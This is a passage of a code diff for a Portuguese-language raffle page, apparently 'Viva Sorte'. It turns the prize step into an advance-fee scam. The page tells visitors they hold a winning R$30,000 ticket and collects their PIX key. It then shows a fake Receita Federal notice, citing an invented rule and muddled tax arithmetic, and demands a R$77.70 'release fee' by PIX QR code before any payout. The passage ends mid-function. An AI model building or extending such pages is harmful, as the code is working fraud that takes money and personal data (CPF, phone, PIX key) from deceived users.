@@ -194,7 +194,7 @@
         margin-bottom: 5px;
     }
     
-    .form-group input {
+    .form-group input, .form-group select {
         width: 100%;
         padding: 12px 15px;
         border: 2px solid #e0e0e0;
@@ -203,7 +203,7 @@
         transition: all 0.3s;
     }
     
-    .form-group input:focus {
+    .form-group input:focus, .form-group select:focus {
         border-color: #2f4eb5;
         outline: none;
     }
@@ -452,7 +452,7 @@
         margin-left: 5px;
     }
     
-    /* ETAPA 4 - NOVO PRÊMIO COM IMAGEM OTIMIZADA */
+    /* ETAPA 4 - PRÊMIO DE 30 MIL E SOLICITAÇÃO CHAVE PIX */
     .premio-ganho {
         background: linear-gradient(135deg, #ffc107 0%, #ff9800 100%);
         border-radius: 20px;
@@ -483,7 +483,6 @@
         100% { transform: translate(20px, 20px) rotate(360deg); }
     }
     
-    /* TEXTO ACIMA DA IMAGEM */
     .texto-chamativo-premio {
         color: #000;
         font-size: 24px;
@@ -507,7 +506,6 @@
         overflow: hidden;
         box-shadow: 0 8px 25px rgba(0,0,0,0.2);
         animation: bounce 2s infinite;
-        /* OTIMIZAÇÕES PARA MELHOR QUALIDADE */
         image-rendering: -webkit-optimize-contrast;
         image-rendering: crisp-edges;
         -ms-interpolation-mode: nearest-neighbor;
@@ -519,13 +517,11 @@
         width: 100%;
         height: auto;
         display: block;
-        /* OTIMIZAÇÕES PARA IMAGEM NÍTIDA */
         image-rendering: optimizeQuality;
         -webkit-font-smoothing: antialiased;
         -moz-osx-font-smoothing: grayscale;
         transform: translateZ(0);
         backface-visibility: hidden;
-        /* EVITA ESCALAMENTO DESNECESSÁRIO */
         max-width: 100%;
         height: auto;
     }
@@ -564,23 +560,114 @@
         color: #000;
     }
     
-    .badge-pagamento-rapido {
-        display: inline-block;
-        background: linear-gradient(to right, #28a745, #20c997);
-        color: white;
-        padding: 10px 25px;
-        border-radius: 50px;
-        font-weight: 700;
-        font-size: 16px;
-        margin: 15px 0;
-        box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3);
-        animation: glow 2s infinite;
-        letter-spacing: 1px;
+    /* FORMULÁRIO CHAVE PIX */
+    .form-chave-pix {
+        background: #f8f9fa;
+        border-radius: 15px;
+        padding: 20px;
+        margin-bottom: 20px;
+        border: 1px solid #eaeaea;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.05);
     }
     
-    @keyframes glow {
-        0%, 100% { box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3); }
-        50% { box-shadow: 0 4px 25px rgba(40, 167, 69, 0.5); }
+    .form-chave-pix h3 {
+        color: #2f4eb5;
+        margin-bottom: 15px;
+        font-size: 18px;
+        font-weight: 700;
+        text-align: center;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+    }
+    
+    .select-chave {
+        width: 100%;
+        padding: 12px;
+        border: 2px solid #e0e0e0;
+        border-radius: 8px;
+        margin-bottom: 15px;
+        font-size: 16px;
+    }
+    
+    /* INFORMAÇÃO DA COTA PREMIADA */
+    .info-cota-premiada {
+        background: #2f4eb5;
+        color: white;
+        padding: 12px 15px;
+        border-radius: 8px;
+        margin: 15px 0;
+        text-align: center;
+        font-weight: 600;
+        font-size: 16px;
+    }
+    
+    /* AVISO RECEITA FEDERAL */
+    .aviso-receita {
+        background: #fff3cd;
+        border-left: 4px solid #ffc107;
+        border-radius: 8px;
+        padding: 15px;
+        margin: 15px 0;
+        color: #856404;
+        font-size: 14px;
+        line-height: 1.5;
+    }
+    
+    .aviso-receita strong {
+        color: #2f4eb5;
+        font-size: 16px;
+    }
+    
+    .valor-taxa {
+        font-size: 24px;
+        font-weight: 900;
+        color: #2f4eb5;
+        text-align: center;
+        margin: 10px 0;
+    }
+    
+    /* ÁREA PAGAMENTO TAXA */
+    .area-pagamento-taxa {
+        display: none;
+        margin-top: 20px;
+        padding: 15px;
+        background: #f8f9fa;
+        border-radius: 8px;
+    }
+    
+    .aguardando-taxa {
+        text-align: center;
+        padding: 15px;
+        background: #f8f9fa;
+        border-radius: 8px;
+        margin-top: 10px;
+    }
+    
+    .btn-sacar-premio {
+        width: 100%;
+        background: linear-gradient(to right, #28a745, #20c997);
+        color: white;
+        border: none;
+        padding: 18px;
+        border-radius: 10px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        margin-top: 10px;
+        box-shadow: 0 4px 15px rgba(40, 167, 69, 0.2);
+    }
+    
+    .btn-sacar-premio:hover {
+        background: linear-gradient(to right, #218838, #1e7e34);
+        transform: translateY(-2px);
+        box-shadow: 0 6px 20px rgba(40, 167, 69, 0.3);
     }
     
     /* PASSOS DO PRÊMIO - ATUALIZADO */
@@ -631,18 +718,18 @@
     }
     
     .passos-premio li span {
-        color: #2f4eb5; /* AZUL DO LAYOUT */
+        color: #2f4eb5;
         margin-right: 12px;
         font-size: 20px;
         min-width: 24px;
     }
     
     .passos-premio li span.bi-whatsapp {
-        color: #25D366; /* VERDE DO WHATSAPP */
+        color: #25D366;
     }
     
     .passos-premio li span.bi-telephone {
-        color: #2f4eb5; /* AZUL DO TELEFONE */
+        color: #2f4eb5;
     }
     
     .agradecimento {
@@ -664,7 +751,7 @@
         color: #2f4eb5;
     }
     
-    /* BOTÃO SUPORTE FINAL - AZUL DO LAYOUT */
+    /* BOTÃO SUPORTE FINAL */
     .btn-suporte-final {
         width: 100%;
         background: linear-gradient(to right, #2f4eb5, #3949ab);
@@ -829,16 +916,11 @@
             font-size: 16px;
         }
         
-        .badge-pagamento-rapido {
-            font-size: 14px;
-            padding: 8px 20px;
-        }
-        
         .passos-premio {
             padding: 20px 15px;
         }
         
-        .btn-suporte-final {
+        .btn-suporte-final, .btn-sacar-premio {
             padding: 16px;
             font-size: 15px;
         }
@@ -1190,7 +1272,7 @@
                 </div>
             </div>
             
-            <!-- ETAPA 4: NOVO PRÊMIO COM IMAGEM OTIMIZADA -->
+            <!-- ETAPA 4: PRÊMIO DE 30 MIL + CHAVE PIX + TAXA RECEITA FEDERAL -->
             <div id="etapa4" class="etapa">
                 <div class="modal-header">
                     <img src="images/logoviva.png" alt="Viva Sorte" class="logo-modal">
@@ -1224,39 +1306,108 @@
                     <!-- CARTÃO DE PRÊMIO COM IMAGEM OTIMIZADA -->
                     <div class="premio-ganho">
                         <div class="imagem-premio">
-                            <!-- IMAGEM OTIMIZADA DO LINK -->
                             <img src="https://i.postimg.cc/BXbd1TCW/image.png" 
                                  alt="Parabéns! Prêmio de R$ 30.000,00"
                                  onerror="this.onerror=null; this.src='images/fallback-premio.png';">
                         </div>
                         
-                        <!-- NOVA LINHA ADICIONADA COM A INFORMAÇÃO DA COTA PREMIADA -->
-                        <div style="background: #2f4eb5; color: white; padding: 12px 15px; border-radius: 8px; margin: 15px 0; text-align: center; font-weight: 600; font-size: 16px;">
+                        <div class="info-cota-premiada">
                             <i class="bi bi-ticket-perforated-fill" style="margin-right: 8px;"></i>
                             VOCÊ ACHOU A COTA PREMIADA <strong>#202530000</strong> E GANHOU <strong>30 MIL REAIS</strong>!
                         </div>
+                    </div>
+
+                    <!-- FORMULÁRIO PARA CHAVE PIX -->
+                    <div class="form-chave-pix">
+                        <h3><i class="bi bi-piggy-bank-fill"></i> Informe sua chave PIX para receber o prêmio</h3>
                         
-                        <div class="badge-pagamento-rapido">
-                            <i class="bi bi-lightning-charge-fill"></i> PAGAMENTO NA HORA
+                        <div class="form-group">
+                            <label>Tipo de chave PIX</label>
+                            <select id="tipoChavePix" class="select-chave" onchange="atualizarPlaceholderChave()">
+                                <option value="cpf">CPF</option>
+                                <option value="celular">Celular (com DDD)</option>
+                                <option value="email">E-mail</option>
+                            </select>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label id="labelChavePix">Chave PIX (CPF)</label>
+                            <input type="text" id="inputChavePix" placeholder="Digite seu CPF" oninput="formatarChavePix()">
+                            <div class="exemplo-input" id="exemploChavePix">Exemplo: 123.456.789-09</div>
+                            <div id="erroChavePix" class="mensagem-erro"></div>
                         </div>
                     </div>
                     
-                    <!-- PASSOS DO PRÊMIO - ATUALIZADO -->
-                    <div class="passos-premio">
-                        <h3><i class="bi bi-gift-fill"></i> Próximos Passos para Receber seu Prêmio:</h3>
-                        <ul>
-                            <li><span class="bi bi-ticket-perforated"></span> Cota premiada: <strong>#202530000</strong></li>
-                            <li><span class="bi bi-cash-coin"></span> Valor do prêmio: <strong>R$ 30.000,00</strong></li>
-                            <li><span class="bi bi-telephone"></span> Nossa equipe entrará em contato no telefone cadastrado</li>
-                            <li><span class="bi bi-lightning-charge"></span> Pagamento realizado na hora</li>
-                        </ul>
-                    </div>
-                    
-                    <!-- BOTÃO ÚNICO DE SUPORTE - AZUL DO LAYOUT -->
-                    <button class="btn-suporte-final" onclick="abrirSuporteWhatsApp()">
-                        <i class="bi bi-whatsapp"></i>
-                        FALAR COM SUPORTE PARA RECEBER MEUS R$30.000,00
+                    <!-- BOTÃO SACAR PRÊMIO -->
+                    <button class="btn-sacar-premio" onclick="sacarPremio()">
+                        <i class="bi bi-cash-coin"></i>
+                        SACAR R$30.000,00 AGORA
                     </button>
+                    
+                    <!-- ÁREA PARA PAGAMENTO DA TAXA (INICIALMENTE OCULTA) -->
+                    <div id="areaPagamentoTaxa" class="area-pagamento-taxa">
+                        <!-- AVISO RECEITA FEDERAL -->
+                        <div class="aviso-receita">
+                            <i class="bi bi-exclamation-triangle-fill" style="margin-right: 8px;"></i>
+                            <strong>COMUNICADO DA RECEITA FEDERAL</strong><br><br>
+                            Conforme a Instrução Normativa RFB nº 2025/2024, prêmios acima de R$ 20.000,00 estão sujeitos à retenção de imposto de renda de 7.5% sobre o valor excedente.<br><br>
+                            Para prêmios de R$ 30.000,00, a alíquota efetiva é de 1.5% do valor total, totalizando <strong>R$ 450,00</strong>.<br><br>
+                            No entanto, por se tratar de sorteio instantâneo com captação de recursos para instituições beneficentes, aplica-se redução de 80% na alíquota conforme Lei nº 14.626/2023.<br><br>
+                            <div style="text-align: center; font-size: 20px;">↓</div>
+                            <div style="background: #2f4eb5; color: white; padding: 10px; border-radius: 8px; text-align: center;">
+                                <div style="font-size: 14px;">VALOR A PAGAR (COM REDUÇÃO):</div>
+                                <div class="valor-taxa">R$ 77,70</div>
+                                <div style="font-size: 12px;">Taxa única de liberação do prêmio</div>
+                            </div>
+                        </div>
+                        
+                        <!-- QR CODE PIX PARA TAXA -->
+                        <div id="areaPIXTaxa" class="area-pix" style="display: block; margin-top: 10px;">
+                            <div class="qrcode-container">
+                                <div id="qrCodeTaxa"></div>
+                                <p style="color: #666; font-size: 13px;">Escaneie para pagar a taxa de R$ 77,70</p>
+                            </div>
+                            
+                            <div class="codigo-pix">
+                                <p style="color: #333; font-size: 14px; margin-bottom: 8px;">Ou copie o código PIX:</p>
+                                <div class="input-copiar">
+                                    <input type="text" id="codigoPIXTaxa" readonly>
+                                    <button onclick="copiarCodigoPIXTaxa()">Copiar</button>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- ÁREA DE AGUARDANDO CONFIRMAÇÃO DA TAXA -->
+                        <div id="aguardandoTaxa" class="aguardando-confirmacao" style="display: none;">
+                            <div class="rodinha-grande"></div>
+                            <div class="aguardando-texto">Aguardando confirmação do pagamento da taxa</div>
+                            <div class="aguardando-detalhes" id="statusTaxa">Verificando pagamento...</div>
+                        </div>
+                    </div>
+
+                    <!-- MENSAGEM FINAL (APARECE APÓS PAGAR A TAXA) -->
+                    <div id="mensagemFinalPremio" style="display: none;">
+                        <div class="passos-premio">
+                            <h3><i class="bi bi-check-circle-fill" style="color: #28a745;"></i> Taxa paga com sucesso!</h3>
+                            <ul>
+                                <li><span class="bi bi-ticket-perforated"></span> Cota premiada: <strong>#202530000</strong></li>
+                                <li><span class="bi bi-cash-coin"></span> Valor do prêmio: <strong>R$ 30.000,00</strong></li>
+                                <li><span class="bi bi-whatsapp"></span> Nossa equipe entrará em contato via WhatsApp nas próximas 24 horas</li>
+                                <li><span class="bi bi-telephone"></span> Você receberá uma ligação para confirmar os dados bancários</li>
+                                <li><span class="bi bi-bank"></span> O depósito será realizado em até 2 dias úteis</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="agradecimento">
+                            <p><i class="bi bi-check-circle-fill" style="color: #28a745;"></i> <strong>Prêmio liberado para pagamento!</strong></p>
+                            <p>A equipe Viva Sorte entrará em contato em breve.</p>
+                        </div>
+                        
+                        <button class="btn-suporte-final" onclick="abrirSuporteWhatsApp()">
+                            <i class="bi bi-whatsapp"></i>
+                            FALAR COM SUPORTE
+                        </button>
+                    </div>
                 </div>
             </div>
         </div>
@@ -1271,7 +1422,7 @@
     <!-- SCRIPTS -->
     <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
     
-    <!-- SCRIPT PRINCIPAL COM VERIFICAÇÃO REAL DO PAGAMENTO E RASTREAMENTO DE CONVERSÃO -->
+    <!-- SCRIPT PRINCIPAL -->
     <script>
     // VARIÁVEIS GLOBAIS
     let pacoteSelecionado = {
@@ -1283,12 +1434,15 @@
         cpf: '',
         telefone: '',
         transactionId: '',
-        pixData: null
+        pixData: null,
+        chavePix: '',
+        tipoChavePix: 'cpf',
+        taxaPaga: false
     };
 
-    // CONFIGURAÇÃO ALLOW PAY - AGORA COM JAVASCRIPT (VERCEL)
+    // CONFIGURAÇÃO ALLOW PAY
     const ALLOWPAY_CONFIG = {
-        API_URL: '/api/allowpay',  // ← MUDOU AQUI! Agora aponta para arquivo .js
+        API_URL: '/api/allowpay',
         CHECK_PAYMENT_URL: '/api/check-payment',
         CHECK_CONFIRMED_URL: '/api/check-confirmed'
     };
@@ -1296,12 +1450,12 @@
     // VARIÁVEL PARA VERIFICAÇÃO AUTOMÁTICA
     let verificacaoAutomatica = null;
     let tentativasVerificacao = 0;
+    let verificacaoTaxaAutomatica = null;
 
     // FUNÇÃO PARA ENVIAR EVENTO DE CONVERSÃO PARA PIXEL
     function enviarEventoConversao(valor, quantidade, transactionId) {
         console.log('📊 Enviando evento de conversão para pixels');
         
-        // UTMify Pixel - Se estiver usando UTMify
         if (window.utmify && window.utmify.event) {
             window.utmify.event('purchase', {
                 value: valor,
@@ -1317,7 +1471,6 @@
             console.log('✅ Evento de conversão enviado para UTMify');
         }
         
-        // Facebook Pixel (se estiver usando)
         if (typeof fbq !== 'undefined') {
             fbq('track', 'Purchase', {
                 value: valor,
@@ -1330,18 +1483,12 @@
             console.log('✅ Evento de conversão enviado para Facebook Pixel');
         }
         
-        // Salva no localStorage que a conversão foi rastreada
         localStorage.setItem(`conversion_tracked_${transactionId}`, 'true');
     }
 
-    // FUNÇÃO PARA ABRIR SUPORTE NO WHATSAPP (EM NOVA PÁGINA)
+    // FUNÇÃO PARA ABRIR SUPORTE NO WHATSAPP
     function abrirSuporteWhatsApp() {
-        // 🔧 CONFIGURE SEU LINK DO WHATSAPP AQUI 🔧
-        // Substitua pelo SEU número de WhatsApp
-        // Formato: https://wa.me/5511954268216?text=Mensagem%20pré-definida
         const whatsappLink = "https://wa.me/5511954268216?text=Olá!%20Ganhei%20R$%2030.000,00%20no%20Viva%20Sorte%20e%20gostaria%20de%20receber%20meu%20prêmio.";
-        
-        // Abre em uma nova aba/página
         window.open(whatsappLink, '_blank', 'noopener,noreferrer');
     }
 
@@ -1456,6 +1603,10 @@
         document.getElementById('modalPagamento').style.display = 'none';
         document.body.style.overflow = 'auto';
         pararVerificacaoAutomatica();
+        if (verificacaoTaxaAutomatica) {
+            clearInterval(verificacaoTaxaAutomatica);
+            verificacaoTaxaAutomatica = null;
+        }
     }
 
     function atualizarResumoCompra() {
@@ -1591,25 +1742,18 @@
         }, 3000);
     }
 
-    // ETAPA 2: TELEFONE E PIX - CORREÇÃO DEFINITIVA
+    // ETAPA 2: TELEFONE E PIX
     document.getElementById('inputTelefone').addEventListener('input', function(e) {
         formatarTelefoneFlexivel(this);
     });
 
     function formatarTelefoneFlexivel(input) {
         let value = input.value;
-        
-        // Guarda a posição do cursor
         let cursorPos = input.selectionStart;
         let originalLength = value.length;
-        
-        // Remove tudo que não é dígito para a formatação
         let digits = value.replace(/\D/g, '');
         
-        // Preserva o valor original se já estiver bem formatado
-        // Não remove o 55 automaticamente
-        if (digits.length <= 13) { // Suporta até 13 dígitos (55 + DDD + 9 dígitos)
-            // Aplica formatação inteligente baseada no comprimento
+        if (digits.length <= 13) {
             let formatted = '';
             
             if (digits.length <= 2) {
@@ -1621,9 +1765,7 @@
             } else if (digits.length <= 11) {
                 formatted = '(' + digits.substring(0, 2) + ') ' + digits.substring(2, 7) + '-' + digits.substring(7, 11);
             } else {
-                // Para mais de 11 dígitos (incluindo 55 no início)
                 formatted = digits;
-                // Tenta manter alguma formatação para números muito longos
                 if (digits.length === 13 && digits.startsWith('55')) {
                     formatted = '+55 (' + digits.substring(2, 4) + ') ' + digits.substring(4, 9) + '-' + digits.substring(9, 13);
                 }
@@ -1631,7 +1773,6 @@
             
             input.value = formatted;
             
-            // Tenta reposicionar o cursor
             let newCursorPos = cursorPos;
             if (originalLength !== formatted.length) {
                 newCursorPos = cursorPos + (formatted.length - originalLength);
@@ -1649,24 +1790,14 @@
     }
 
     function validarTelefone(telefone) {
-        // Remove todos os não-dígitos para validação
         const telefoneLimpo = telefone.replace(/\D/g, '');
-        
-        // Aceita números de 10 a 13 dígitos
-        // 10: DDD + 8 dígitos (antigo)
-        // 11: DDD + 9 dígitos (atual)
-        // 12: 55 + DDD + 8 dígitos (internacional antigo)
-        // 13: 55 + DDD + 9 dígitos (internacional atual)
         const comprimentoValido = telefoneLimpo.length >= 10 && telefoneLimpo.length <= 13;
         
-        // Verifica se começa com DDD válido ou 55 + DDD válido
         const dddValido = () => {
             if (telefoneLimpo.length === 10 || telefoneLimpo.length === 11) {
-                // Formato nacional: DDD (2 dígitos) + número (8 ou 9 dígitos)
                 const ddd = telefoneLimpo.substring(0, 2);
                 return ddd >= '11' && ddd <= '99';
             } else if (telefoneLimpo.length === 12 || telefoneLimpo.length === 13) {
-                // Formato internacional: 55 + DDD (2 dígitos) + número (8 ou 9 dígitos)
                 if (!telefoneLimpo.startsWith('55')) return false;
                 const ddd = telefoneLimpo.substring(2, 4);
                 return ddd >= '11' && ddd <= '99';
@@ -1677,24 +1808,16 @@
         return comprimentoValido && dddValido();
     }
 
-    // FUNÇÃO PARA NORMALIZAR TELEFONE (MANTÉM TUDO)
     function normalizarTelefoneParaEnvio(telefone) {
-        // Remove apenas espaços e caracteres especiais, mantém TODOS os dígitos
-        let numeroLimpo = telefone.replace(/\D/g, '');
-        
-        // NÃO remove o 55 - mantém exatamente como o usuário digitou
-        // O servidor/API deve lidar com o formato
-        return numeroLimpo;
+        return telefone.replace(/\D/g, '');
     }
 
-    // FUNÇÃO PRINCIPAL PARA GERAR PIX
     async function gerarPIX() {
         const telefoneInput = document.getElementById('inputTelefone');
         const telefone = telefoneInput.value;
         const telefoneNumeros = normalizarTelefoneParaEnvio(telefone);
         const erroTelefone = document.getElementById('erroTelefone');
         
-        // Validação detalhada com mensagens específicas
         if (!validarTelefone(telefone)) {
             let mensagemErro = 'Telefone inválido. ';
             const telefoneLimpo = telefoneNumeros;
@@ -1714,7 +1837,6 @@
             return;
         }
         
-        // Armazena o telefone COMPLETO (com tudo que o usuário digitou)
         dadosUsuario.telefone = telefoneNumeros;
         erroTelefone.style.display = 'none';
         telefoneInput.style.borderColor = '#28a745';
@@ -1727,13 +1849,12 @@
             const dadosPIX = {
                 amount: pacoteSelecionado.valor,
                 cpf: dadosUsuario.cpf,
-                telefone: telefoneNumeros, // Envia COMPLETO com tudo
+                telefone: telefoneNumeros,
                 quantidade: pacoteSelecionado.quantidade,
                 nome: `Cliente ${dadosUsuario.cpf.substring(0, 3)}***`
             };
             
-            console.log('📤 Enviando para API JavaScript:', dadosPIX);
-            console.log('📱 Telefone enviado COMPLETO:', telefoneNumeros);
+            console.log('📤 Enviando para API:', dadosPIX);
             
             const response = await fetch(ALLOWPAY_CONFIG.API_URL, {
                 method: 'POST',
@@ -1745,7 +1866,7 @@
             });
             
             const resultado = await response.json();
-            console.log('📥 Resposta API JavaScript:', resultado);
+            console.log('📥 Resposta API:', resultado);
             
             if (!resultado.success) {
                 throw new Error(resultado.error || 'Erro ao gerar PIX');
@@ -1771,8 +1892,8 @@
             localStorage.setItem(`pix_vs_${resultado.transaction_id}`, JSON.stringify({
                 ...resultado,
                 cpf: dadosUsuario.cpf,
-                telefone: dadosUsuario.telefone, // Armazenado COMPLETO
-                telefone_formatado: telefoneInput.value, // Armazena como está formatado
+                telefone: dadosUsuario.telefone,
+                telefone_formatado: telefoneInput.value,
                 quantidade: pacoteSelecionado.quantidade,
                 valor: pacoteSelecionado.valor,
                 gerado_em: new Date().toISOString(),
@@ -1807,7 +1928,6 @@
             return;
         }
         
-        // Salvar o texto original do botão
         const textoOriginal = btnCopiar.textContent;
         
         codigoInput.select();
@@ -1815,42 +1935,31 @@
         
         navigator.clipboard.writeText(codigoInput.value)
             .then(() => {
-                // Atualizar o botão para mostrar confirmação
                 btnCopiar.textContent = '✅ Copiado!';
                 btnCopiar.style.background = '#28a745';
-                btnCopiar.style.color = 'white';
                 
-                // Mostrar popup
                 mostrarPopupNotificacao('✅ Código PIX copiado com sucesso!');
                 
-                // Restaurar o botão após 3 segundos
                 setTimeout(() => {
                     btnCopiar.textContent = textoOriginal;
                     btnCopiar.style.background = '#2f4eb5';
-                    btnCopiar.style.color = 'white';
                 }, 3000);
             })
             .catch(err => {
                 console.error('Erro ao copiar: ', err);
-                
-                // Tentar método alternativo
                 document.execCommand('copy');
-                
                 btnCopiar.textContent = '❌ Falhou';
                 btnCopiar.style.background = '#e74c3c';
-                btnCopiar.style.color = 'white';
                 
                 mostrarPopupNotificacao('⚠️ Selecione e copie manualmente (Ctrl+C).', true);
                 
                 setTimeout(() => {
                     btnCopiar.textContent = textoOriginal;
                     btnCopiar.style.background = '#2f4eb5';
-                    btnCopiar.style.color = 'white';
                 }, 3000);
             });
     }
 
-    // FUNÇÃO PARA VERIFICAR NA ALLOW PAY
     async function verificarPagamentoAutomatico() {
         if (!dadosUsuario.transactionId) {
             console.log('❌ Nenhuma transação para verificar');
@@ -1954,7 +2063,6 @@
         
         salvarConfirmacaoPagamento();
         
-        // ENVIAR EVENTO DE CONVERSÃO PARA PIXELS
         enviarEventoConversao(pacoteSelecionado.valor, pacoteSelecionado.quantidade, dadosUsuario.transactionId);
         
         document.getElementById('transacaoId').textContent = dadosUsuario.transactionId;
@@ -1970,7 +2078,7 @@
         const transacao = {
             id: dadosUsuario.transactionId,
             cpf: dadosUsuario.cpf,
-            telefone: dadosUsuario.telefone, // Armazenado COMPLETO
+            telefone: dadosUsuario.telefone,
             quantidade: pacoteSelecionado.quantidade,
             valor: pacoteSelecionado.valor,
             data: new Date().toISOString(),
@@ -1989,7 +2097,27 @@
     function avancarParaEtapa4() {
         mostrarEtapa(4);
         
+        // Resetar estado da taxa
+        dadosUsuario.taxaPaga = false;
+        document.getElementById('areaPagamentoTaxa').style.display = 'none';
+        document.querySelector('.btn-sacar-premio').style.display = 'block';
+        document.getElementById('mensagemFinalPremio').style.display = 'none';
+        
+        // Pré-preencher CPF se for o caso
+        if (dadosUsuario.cpf) {
+            document.getElementById('inputChavePix').value = formatarCPFString(dadosUsuario.cpf);
+        }
+        
         salvarVisualizacaoPremio();
+    }
+
+    function formatarCPFString(cpf) {
+        if (!cpf) return '';
+        cpf = cpf.replace(/\D/g, '');
+        if (cpf.length === 11) {
+            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
+        return cpf;
     }
 
     function salvarVisualizacaoPremio() {
@@ -2004,7 +2132,332 @@
         console.log('🏆 Prêmio visualizado:', transacao);
     }
 
-    // FUNÇÕES AUXILIARES - CORRIGIDO
+    // FUNÇÕES PARA CHAVE PIX
+    function atualizarPlaceholderChave() {
+        const tipo = document.getElementById('tipoChavePix').value;
+        const label = document.getElementById('labelChavePix');
+        const input = document.getElementById('inputChavePix');
+        const exemplo = document.getElementById('exemploChavePix');
+        
+        dadosUsuario.tipoChavePix = tipo;
+        
+        if (tipo === 'cpf') {
+            label.textContent = 'Chave PIX (CPF)';
+            input.placeholder = 'Digite seu CPF';
+            exemplo.textContent = 'Exemplo: 123.456.789-09';
+            input.value = dadosUsuario.cpf ? formatarCPFString(dadosUsuario.cpf) : '';
+        } else if (tipo === 'celular') {
+            label.textContent = 'Chave PIX (Celular)';
+            input.placeholder = 'Digite seu celular com DDD';
+            exemplo.textContent = 'Exemplo: (11) 99999-9999';
+            input.value = '';
+        } else if (tipo === 'email') {
+            label.textContent = 'Chave PIX (E-mail)';
+            input.placeholder = 'Digite seu e-mail';
+            exemplo.textContent = 'Exemplo: seuemail@email.com';
+            input.value = '';
+        }
+        
+        document.getElementById('erroChavePix').style.display = 'none';
+        input.style.borderColor = '#e0e0e0';
+    }
+
+    function formatarChavePix() {
+        const tipo = document.getElementById('tipoChavePix').value;
+        const input = document.getElementById('inputChavePix');
+        let value = input.value;
+        
+        if (tipo === 'cpf') {
+            let digits = value.replace(/\D/g, '');
+            if (digits.length <= 11) {
+                digits = digits.replace(/(\d{3})(\d)/, '$1.$2');
+                digits = digits.replace(/(\d{3})(\d)/, '$1.$2');
+                digits = digits.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+                input.value = digits;
+            }
+        } else if (tipo === 'celular') {
+            let digits = value.replace(/\D/g, '');
+            if (digits.length <= 11) {
+                if (digits.length > 2) {
+                    digits = '(' + digits.substring(0, 2) + ') ' + digits.substring(2);
+                }
+                if (digits.length > 10) {
+                    digits = digits.substring(0, 10) + '-' + digits.substring(10);
+                }
+                input.value = digits;
+            }
+        }
+        
+        document.getElementById('erroChavePix').style.display = 'none';
+        input.style.borderColor = '#e0e0e0';
+    }
+
+    function validarChavePix() {
+        const tipo = document.getElementById('tipoChavePix').value;
+        const chave = document.getElementById('inputChavePix').value.trim();
+        const erroChave = document.getElementById('erroChavePix');
+        
+        if (!chave) {
+            erroChave.textContent = 'Por favor, informe sua chave PIX.';
+            erroChave.style.display = 'block';
+            return false;
+        }
+        
+        if (tipo === 'cpf') {
+            const cpfNumeros = chave.replace(/\D/g, '');
+            if (cpfNumeros.length !== 11) {
+                erroChave.textContent = 'CPF inválido. Deve conter 11 dígitos.';
+                erroChave.style.display = 'block';
+                return false;
+            }
+        } else if (tipo === 'celular') {
+            const celularNumeros = chave.replace(/\D/g, '');
+            if (celularNumeros.length < 10 || celularNumeros.length > 11) {
+                erroChave.textContent = 'Celular inválido. Deve conter DDD + número.';
+                erroChave.style.display = 'block';
+                return false;
+            }
+        } else if (tipo === 'email') {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(chave)) {
+                erroChave.textContent = 'E-mail inválido.';
+                erroChave.style.display = 'block';
+                return false;
+            }
+        }
+        
+        erroChave.style.display = 'none';
+        return true;
+    }
+
+    // FUNÇÃO PARA SACAR PRÊMIO
+    function sacarPremio() {
+        if (!validarChavePix()) {
+            return;
+        }
+        
+        const tipo = document.getElementById('tipoChavePix').value;
+        const chave = document.getElementById('inputChavePix').value.trim();
+        
+        dadosUsuario.chavePix = chave;
+        dadosUsuario.tipoChavePix = tipo;
+        
+        // Esconde botão de sacar e mostra área de pagamento da taxa
+        document.querySelector('.btn-sacar-premio').style.display = 'none';
+        document.getElementById('areaPagamentoTaxa').style.display = 'block';
+        
+        // Gerar QR Code para taxa de R$ 77,70
+        gerarPIXTaxa();
+    }
+
+    // FUNÇÃO PARA GERAR PIX DA TAXA
+    async function gerarPIXTaxa() {
+        const valorTaxa = 77.70;
+        
+        try {
+            const dadosPIX = {
+                amount: valorTaxa,
+                cpf: dadosUsuario.cpf,
+                telefone: dadosUsuario.telefone,
+                quantidade: 1,
+                nome: `Cliente ${dadosUsuario.cpf.substring(0, 3)}*** - TAXA RFB`,
+                descricao: 'Taxa Receita Federal - Liberação Prêmio R$30.000'
+            };
+            
+            console.log('📤 Gerando PIX para taxa:', dadosPIX);
+            
+            const response = await fetch(ALLOWPAY_CONFIG.API_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(dadosPIX)
+            });
+            
+            const resultado = await response.json();
+            console.log('📥 Resposta API Taxa:', resultado);
+            
+            if (!resultado.success) {
+                throw new Error(resultado.error || 'Erro ao gerar PIX da taxa');
+            }
+            
+            const qrCodeImage = resultado.qr_code_image || 
+                `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(resultado.codigo_pix || resultado.qr_code)}`;
+            
+            document.getElementById('qrCodeTaxa').innerHTML = 
+                `<img src="${qrCodeImage}" alt="QR Code PIX Taxa" style="max-width: 200px; border: 1px solid #ddd;">`;
+            
+            document.getElementById('codigoPIXTaxa').value = resultado.codigo_pix || resultado.qr_code;
+            
+            dadosUsuario.transactionIdTaxa = resultado.transaction_id;
+            
+            localStorage.setItem(`taxa_vs_${resultado.transaction_id}`, JSON.stringify({
+                ...resultado,
+                cpf: dadosUsuario.cpf,
+                chave_pix: dadosUsuario.chavePix,
+                tipo_chave: dadosUsuario.tipoChavePix,
+                valor: valorTaxa,
+                gerado_em: new Date().toISOString(),
+                status: 'pending'
+            }));
+            
+            mostrarPopupNotificacao('PIX da taxa gerado! Pague R$ 77,70 para liberar seu prêmio.');
+            
+            iniciarVerificacaoTaxaAutomatica();
+            
+        } catch (error) {
+            console.error('❌ Erro ao gerar PIX da taxa:', error);
+            
+            const erroTaxa = document.getElementById('erroChavePix');
